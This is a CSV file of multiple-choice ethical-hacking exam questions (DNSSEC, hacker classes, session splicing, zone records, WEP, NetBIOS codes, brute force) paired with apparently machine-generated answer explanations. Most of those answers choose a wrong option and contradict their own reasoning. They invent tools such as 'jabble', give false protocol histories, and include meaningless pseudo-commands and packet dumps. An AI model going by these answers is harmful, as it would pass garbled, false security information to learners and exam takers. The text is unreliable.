index,question,llm_answer
11,"is a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so
as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks.
A.  DNSSEC
B.  Resource records
C.  Resource transfer
D.  Zone transfer
","
the correct answer is b. dns poisoning and related attacks are common and relatively easy to pull off. a dns poisoning attack looks simply this : the attacker sends a false response to dns that points to a valid ip for a domain the client belongs to. because dns clients ( resolvers ) will always attempt to connect to the ip provided by dns rather than their own, which is what would occur if things worked the way they should. to pull this off, you just need to get your dns client to connect to the fake ip provided by your attacker. similarly, similar host records could be used to redirect to other ip addresses. because dns uses udp for transmission, this attack is easy to conceal. dnssec is a proposal to use dns to push information ( resources, files, or other data ) to a designated recipient. to accomplish this, an authority ( usually a server ) makes efforts to mark records for the designated domain ( url ) so that any device requesting an address can get the necessary information. this is done using rsds, which can be transmitted over dns. if a device wants or needs a resource, it queries dns for the rsds and then obtains the required information. this process protects the consumer ( device ) from misrouting or spoofing attacks on dns servers. bsd, microsoft, or linux still uses dns substantially the same way it has since the 1980s. dns requests from a client like a router or a linux machine simply ask dns for the information it needs and"
12,"A hacker is an intelligent individual with excellent computer skills and the ability to explore a computer?s
software and hardware without the owner?s permission. Their intention can either be to simply gain knowledge
or to illegally make changes.
Which of the following class of hacker refers to an individual who works both offensively and defensively at
various times?
A.  White Hat
B.  Suicide Hacker
C.  Gray Hat
D.  Black Hat
","
the correct answer is d. i ’ m convinced there are somewehere some people who think there are no differences between black, gray, and gray hat when it comes to hackers, but for purpose of this question, we ’ re going to stick with the way they know well. a black hat is a hacker who works solely to exploit weaknesses in the system, for example, attack and exploit developers. a gray hat is a hacker who works either way—good or bad. the difference between gray and black is that gray hat is any kind of hacker who works with good reason and for good cause. example : an attacker during the day who is trying to exploit weaknesses in the system for revenue. a black hat is a hacker who does bad things for bad reason and without good purpose. example : an attacker who does bad in order to get good. both examples are illegal, no matter what you call yourself. a white hat is a hacker who works for the betterment of the society and the computer world by providing security improvements to systems and organizations. they do this either by working for the internal staff or by working for organizations directly. another type of white hat is a hacker who works for a company in order to raise awareness about problems with the system. all of these are white hats because they are working for good cause and for the good of the computer world. the final type is the hacker who works for the good of the hacker, who is guilty of blackmailing and extortion. called blackmail"
13,"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets
to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be
used to perform session splicing attacks?
A.  tcpsplice
B.  Burp
C.  Hydra
D.  Whisker
","
the correct answer is c. ids evasion tools include wappalyzer, htttracker, and url status meter. all of them will show you an open port and possibly even identify you traffic as a target. for example, if your machine is on msn groups, url status meter will show you a closed 443 protocol port. on a linux machine, the following command will show you all open ports and one of them is usually a session splicing tool. in this example, hi has been running a snort script for pasted traffic, and hbo is the tool that shows you open ports. remember, session splicing uses small, sized packets to fool an ids, so sending large, robust packets may hide the attack. for example, the following command sends large, robust packets to pass through : sendpreamble admin=opinion=interest=1 1500<=seq<2000 – seq 2462402190 1492 0 0 141599802. just try sending pasted large packets to your target and watch what happens. you can use toolchatter, but once you know session splicing, you ’ ll understand it better. as an aside, pasting packets full of! and & doesn ’ t really make much sense, so avoid it. for the real world, session splicing is usually of little value in the real world, and you ’ ll probably find it a gimmick, but the ideas behind it are decent. remember,"
14,"An incident investigator asks to receive a copy of the event logs from all firewalls, proxy servers, and
Intrusion Detection Systems (IDS) on the network of an organization that has experienced a possible breach of
security. When the investigator attempts to correlate the information in all of the logs, the sequence of many of
the logged events do not match up.
What is the most likely cause?
A.  The network devices are not all synchronized.
B.  Proper chain of custody was not observed while collecting the logs.
C.  The attacker altered or erased events from the logs.
D.  The security breach was a false positive.
","
the correct answer is b. when it comes to collecting logs, there are a number of ways to go about it. first and probably most obvious is to observe convention. most logs will provide a means to copy log files to an external location, device, or application. many organizations now provide a schedule for the rotation, maintenance, and synchronization of logs. replacing ancient usb sticks, cds, tapes, and pendrive subscriptions in the clear can help in identifying where the real problem may be. the technique referred to as correlation is taking the logs from different sources and comparing them. a common way to do this is to combine the logs from ids systems in one log file. it ’ s fairly common to see an effort investigator receiving a copy of all logs from all ids systems in one combined log file. another way is to synchronize the ids systems and have the investigator access a single source. lastly, a complete correlation exercise involves coordinating efforts between different log file holders ( systems, applications, and humans ). if any of those elements is not trained, diligent, and organized in the correlation process, it ’ s likely the log owner will fall short of the goal line. another note on correlation is that so so much can be done in a computer with a log correlation tool ( like warden ) that you might want to ignore it manually for this task. all i can say here is that most cor- relation tools don ’ t cost a dollar and can be a valuable addition to security during"
15,"A zone file consists of which of the following Resource Records (RRs)?
A.  DNS, NS, AXFR, and MX records
B.  DNS, NS, PTR, and MX records
C.  SOA, NS, AXFR, and MX records
D.  SOA, NS, A, and MX records
","
the correct answer is b. a zone file consists of only dns records. there are no other records that are created in this file. the dns server will examine only those resource records located in the same record that contains the hostname that is addressed. if the hostname is named, the resources listed within that record will be searched as well. for example, the following dns record response would be sent to the server identified by the mx record : brian-mcmanus-dnsserver.com. mx response brian-mcmanus-dnsserver.com. and if the hostname was located in the same record as the ip address, the response would be referred to as a ptr record : : : the hostname : : : address pair brian-mcmanus-dnsserver.com. : : 68.99.50.78 in this example : response soa record the following is a summary of dns record types : soa this record defines the address of the server that is responsible for responding to ip addresses asking for information in that zone. ns this record identifies one or more nameservers within the target zone. a, axfr, and mx these records are used to provide a channel to a client that is intending to look at records in that zone. ptr this record maps an ip address to a hostname that is typically providing an ip address response. watch that the absence of a ptr record does not imply that a zone does not exist : for example, the google web server may be offering"
16,"If a tester is attempting to ping a target that exists but receives no response or a response that states the
destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option
could the tester use to get a response from a host using TCP?
A.  Traceroute
B.  Hping
C.  TCP ping
D.  Broadcast ping
","
the correct answer is c. traceroute ( url = '' google.com '' ) is the only option there. this program will route your request to targets and report back to you. if the target is using tcp, you ’ ll get a response back. by "" quite likely '', i am saying that it is fairly certain that the protocol is using tcp. it ’ s more likely that the network is using icmp echo request than icmp echo response. a packet capture is shown here : 223.244.50.50# ping 238.239.250.50 -- - - -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 090.236.0.0.820 > 192.168.1.20 ( tcp ) : [ icmp time to live 1, timestamp 1435134428 241.0.169.250# ping 238.239.250.50 - - - - - - - - - - - - - - - - - - - - - - 192.168.1.20 220 155 112 0 0 240.255.255.240# icmp code pid = 0 src udp 1424 dest 238.239.250.50 : tcp - - - - - - - - - - - - - - - - - - - - - - : pid= name : udp psh 1424 238"
17,"This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to
protect sensitive data, such as GCMP-2S6. MMAC-SHA384, and ECDSA using a 384-bit elliptic curve.
Which is this wireless security protocol?
A.  WPA2 Personal
B.  WPA3-Personal
C.  WPA2-Enterprise
D.  WPA3-Enterprise
","
the correct answer is d. are you ready for this question? ec-council has multiple wireless security protocol questions on the exam, and answering them correctly will be a key to doing well. wpa2 was released in 2001 as an enterprise-level wireless security protocol alternative to wep. where the wep protocol used fcs ( file control protocol ) to exchange information about broadcasts and how to calculate clock times, wpa2 used ecp ( elliptic curve privacy ) and shifted the maximum security level to 192 bits. additionally, because of improvements in wireless technology at the time, use of broadcast behavior was stopped. also, because of better media protection measures at the network layer, broadcasters couldn ’ t broadcast freely anymore on 6.00m or 52.50fh. wpa3, coming out in 2009, replaced wpa2 and improved upon it in many ways. main differences from what you see provided by dd-dns and other sources are as follows : wpa2 used mmac-sha384 and ecdsa using a 384-bit elliptic curve. wpa3 used secp-224 and nsa-204 and created a smaller size file ( 384 bits ) for encryption and protection from broadcast. additionally, one of the last issues with broadcast behavior under wpa2 was resolved in wpa3. wpa2 entered enterprise space in the 1990s and was a good step forward in terms of security and wireless networking."
18,"John, a professional hacker, targeted an organization that uses LDAP for accessing distributed directory
services. He used an automated tool to anonymously query the IDAP service for sensitive information such as
usernames. addresses, departmental details, and server names to launch further attacks on the target
organization.
What is the tool employed by John to gather information from the IDAP service?
A.  jxplorer
B.  Zabasearch
C.  EarthExplorer
D.  Ike-scan
","
the correct answer is d. the program jabble is a linux-based tool that makes use of xml to store and manipulate information. as an example, used user and group files may be described this way : and : < record < ggroup < gname < name > < cgname < cgname > < guid > < url > > > > and : < list < eg > < eg > < li > www.example.com < url > > > > and : < file < fname > < fname > < file > > > and : < p < text > > < p > www.example.com < p > > a jabble instance is linked to any url containing the syntax : and : < file < fname > < file > < p < text > > < p > www.example.com < p > > a standard url would simply be : and : < p < text > > < p > www.example.com < p > > in this instance, john used the jabble tool, and ike-scan to scan the local network from the cache rather than retrieving everything again from the server. in other words, using local and remote tools together, john could effectively hide his location by hiding his origin country from the whois server and almost magically become a foreign user ( given the sensitive information as a service ). this is all to say that john was using jabble, and ike-scan was used to help in the attack. as an aside, the tool itself wouldn"
19,"A friend of yours tells you that he downloaded and executed a file that was sent to him by a coworker. Since
the file did nothing when executed, he asks you for help because he suspects that he may have installed a
trojan on his computer.
what tests would you perform to determine whether his computer Is Infected?
A.  Use ExifTool and check for malicious content.
B.  You do not check; rather, you immediately restore a previous snapshot of the operating system.
C.  Upload the file to VirusTotal.
D.  Use netstat and check for outgoing connections to strange IP addresses or domains.
","
the correct answer is b. the first and obvious one to mention here is the body of the question : “ what tests would you perform to determine whether a computer has been infected? ” almost without exception, answers to this question will involve some in-depth examination of technology, software, and even antivirus programs. you ’ ll probably see two to four answers here, depending on many factors. the second question involves the story of a friend you know who actually sends a harmless file to a friend. do some checking yourself on what you know about technology and see if you can find a reason to believe him told the truth. almost without exception on the exam, that story will be based in reality. netstat -a command line tool for checking the operating system paths of a computer : the netstat command in windows is one way to look at traffic on a local network. -a switch gives you a full look at all the paths the tool knows about. this command is equivalent to netstat -b which gives you an address grid on the local network and connects to listening ports on it. one final note on netstat : you will not really get a true look at technology on this question ; instead, what you ’ re really looking for is how much faith you can place in the answer best representing your knowledge and experience. assuming that ’ s clear, the rest of what you know about the computer and its owner will probably be useful in determining the answer. there are other ways to check for and test"
20,"Which type of sniffing technique is generally referred as MiTM attack?
A.  Password Sniffing
B.  ARP Poisoning
C.  Mac Flooding
D.  DHCP Sniffing
","
the correct answer is b. mitm ( mirror image of a network ) attacks can be used as a denial-of-service attack, poisoning arp poisons so stations will respond to unknown arp responses from your machine. mac flooding is another arp poisoning technique. dhcp sniffing is a slightly different technique. a tool that does dhcp sniffing is nmap, since it supports the -sn flag for snarfing dhcp packets. another tool that can do it is hping, since it has both -sn and -p flags. a mitm attack is generally referred to as ping cross-ing ( sometimes written as ping cross-guests ). another technique is session hijacking, which means hijacking a session between two systems. the session could be a tcp session or a session between udp. arp poisoning is another tcp-related technique. a packet can obviously contain information about connections to other hosts. since tcp uses port 0 for background or “ unknown ” data, giving you an arp poem like this would work well. another option is session hijacking, but sessions can include more than just arp information. an arp poem could possibly come from an attacker trying to gain a session on a target system. another one is session hijacking and session spying, which basically mean the same thing. one last one on your exam is session hijacking and session spying not going via arp poems, except maybe in the confusion of a memory attack. a memory attack is apparently crazy enough to pull off, so any attack like"
21,"Johnson, an attacker, performed online research for the contact details of reputed cybersecurity firms. He
found the contact number of sibertech.org and dialed the number, claiming himself to represent a technical
support team from a vendor. He warned that a specific server is about to be compromised and requested
sibertech.org to follow the provided instructions. Consequently, he prompted the victim to execute unusual
commands and install malicious files, which were then used to collect and pass critical Information to
Johnson's machine. What is the social engineering technique Steve employed in the above scenario?
A.  Quid pro quo
B.  Diversion theft
C.  Elicitation
D.  Phishing
","
the correct answer is b. almost without exception, social engineering has a “ tell ” tool to pull off the success bar. whether it ’ s a smile, a grin, a happy smile, a happy grin, a little bit of information, or a whole lot of information, the tell is a smile or a happy smile that tells you something isn ’ t right in your path. social engineering relies on the truthfulness of false information, which normally falls into one of the following categories : phishing, smishing, and appstore cheating. phishing is basically pretending to be something you aren ’ t, whether on email, through a messenger, or using some other delivery method. smishing is using your smartphone to pretend to be something you aren ’ t—typically a server or other information technology resource. appstore cheating is pretending to be a useful application you shouldn ’ t have because one exists or is added to a program. stealing through phishing is known as the diversion theft attack because phishing can open a back channel for fraud and frauds to sit and wait in. an attacker there can monitor user communications and identify vulnerable systems. social engineering attacks usually fall in one of two categories : identity theft and spearpoint hacking. identity theft attacks usually fall in two categories : online identity theft and shoulder surfing. online identity theft uses phishing and some form of social engineering to gain login information, credit card information, or other sensitive data. shoulder surfing does nothing real-world equivalent to, but instead surveys the shoulders"
22,"There have been concerns in your network that the wireless network component is not sufficiently secure. You
perform a vulnerability scan of the wireless network and find that it is using an old encryption protocol that
was designed to mimic wired encryption, what encryption protocol is being used?
A.  WEP
B.  RADIUS
C.  WPA
D.  WPA3
","
the correct answer is b. one of the reasons there are concerns regarding the security of the wireless network is because so many basic security concepts are missing out in the arena of wireless security. from the network layer up, there are several gaps where security should be provided, but aren ’ t. at wireless level, we ’ re still discussing the network layer. so, the wireless network should be protected by the same security flaws as the wired network. the difference is most wired networks are protected by a firewall. in the wireless realm, the radio chain protection should protect you just as well. so, looking at the specs for the radius, we see the following is addressed by the ssid : phd = 802.1a, radio header = 0.0.0.0, phc = 0.1.0.0, channel = 6, awa = 0, awr = 0, howtar = 0, pbc = 11. the radio header contains some useful pieces of information. dsn is the destination secret, which determines the key that is used to encrypt data transmissions. it is derived once per station and used to encrypt data transmission. the serial number determines the product of the key. the code gives the value. the code is phd, which determines the radio header features. the features are phc, which determines the radio chain protocol in use. the radio chain protocol determines how the radio headers are created. the radio header"
23,"Wilson, a professional hacker, targets an organization for financial benefit and plans to compromise its
systems by sending malicious emails. For this purpose, he uses a tool to track the emails of the target and
extracts information such as sender identities, mall servers, sender IP addresses, and sender locations from
different public sources. He also checks if an email address was leaked using the haveibeenpwned.com API.
Which of the following tools is used by Wilson in the above scenario?
A.  Factiva
B.  Netcraft
C.  infoga
D.  Zoominfo
","
the correct answer is c. haveibeenpwned.com is a great tool and website ( url is linked in note box in chapter 8 of trust it services ( v2 ) from saoban ( google forces a proxy port number of 80 which is not usual ). from any computer ( your own or the attacker ’ s ) you can access the site and check if an email address is leaked. as an aside, haveibeenpwned.com is a great resource when it comes to memory usage and web page copies. for example, a google search for ( url + haveibeenpwned ) shows where the site lists abandoned ports and associated users. as an aside, haveibeenpwned.com is great when it comes to memory usage and web page copies. for example, a google search for ( url + haveibeenpwned ) shows where the site lists abandoned ports and associated users. as an additional note, the following links provide additional information on haveibeenpwned.com : url gives a free soa ( version 2 ) guide from saoban ( google forces a proxy port number of 80 which is not usual ). url gives a paid go ( google web page version 2 ) guide from saoban ( the same as that of version 1 ). url gives a free tool ( v2 ) guide from saoban ( again, the same as that of version 1 ). url gives"
24,"Allen, a professional pen tester, was hired by xpertTech solutWns to perform an attack simulation on the
organization's network resources. To perform the attack, he took advantage of the NetBIOS API and targeted
the NetBIOS service. B/enumerating NetBIOS, he found that port 139 was open and could see the resources
that could be accessed or viewed on a remote system. He came across many NetBIOS codes during
enumeration.
identify the NetBIOS code used for obtaining the messenger service running for the logged-in user?
A.  <1B>
B.  <00>
C.  <03>
D.  <20>
","
the correct answer is b. after a few steps and some research, you ’ ll be able to identify the netbios version used. netbios ( nb ) is a networking protocol that was initially designed to replace the net and appernet in the early ’ 80s. netbios protocol version ( nbpv ) indicates the version in use and the number of stand-alone and network sessions that are running. for example, version 1 sends only over port 139, just as mentioned. however, version 2 also sends over 515 and 536 in addition. the codes shown demonstrate whether a connection was open and who had sent the code. for example, 3 indicates the “ wait ” code. therefore, waiting for the machine to connect and connect successfully before doing the rest of the enumeration. other codes to watch for are 20, which indicates that the messenger service ( a highly integrated application commonly used with nb ) is running. another version, 00, indicates that the netbios server, which is normally placed in the local area, is open. in addition to enumeration itself and answers to some netbios questions, you will see one question like this on the exam : what netbios version was used in connecting to the messenger service? a. 3 b. 2 c. 6 d. 5 e. 4 f. 1 g. 6 h. 3 i. 2 j. 5 k. 4 l. 6 m"
25,"When discussing passwords, what is considered a brute force attack?
A.  You attempt every single possibility until you exhaust all possible combinations or discover the password
B.  You threaten to use the rubber hose on someone unless they reveal their password
C.  You load a dictionary of words into your cracking program
D.  You create hashes of a large number of words and compare it with the encrypted passwords
E.  You wait until the password expires
","
the correct answer is d. as defined in the nist special publication 800 series, a brute force attack “ involves attempting every possible combination of passwords and decrypting the combinations repeatedly. ” basically, you take every possible password and see if it will decrypt to a valid password. loading a dictionary of words into your cracking program doesn ’ t solve anything because you still won ’ t know what password you ’ re looking for until you see what each of the words decrypt to. waiting until the password expires is irrelevant and is not considered brute force in this context. you could potentially use a rubber hose to force someone to reveal their password to extract it in a brute force attack. however, the rubber hose won ’ t protect you against a password expiring due to a user mistake ( inserting a “ secret key ” ). a brute force attack isn ’ t used as a way to extract passwords ; it ’ s used to attempt every possible password combination. there is still expiring or some other action necessary before the password will be exposed. a rubber hose is not a crime. throwing a rubber hose at someone and asking them to reveal their password is extortion. it ’ s not a brute force attack in the sense that you are trying every possible password ; however, you are loading a dictionary of words into your cracking program to force someone to expose their password because a brute force attack involves attempting every possible password combination. a rubber hose is not a crime, and throwing a rubber hose at someone and asking them"
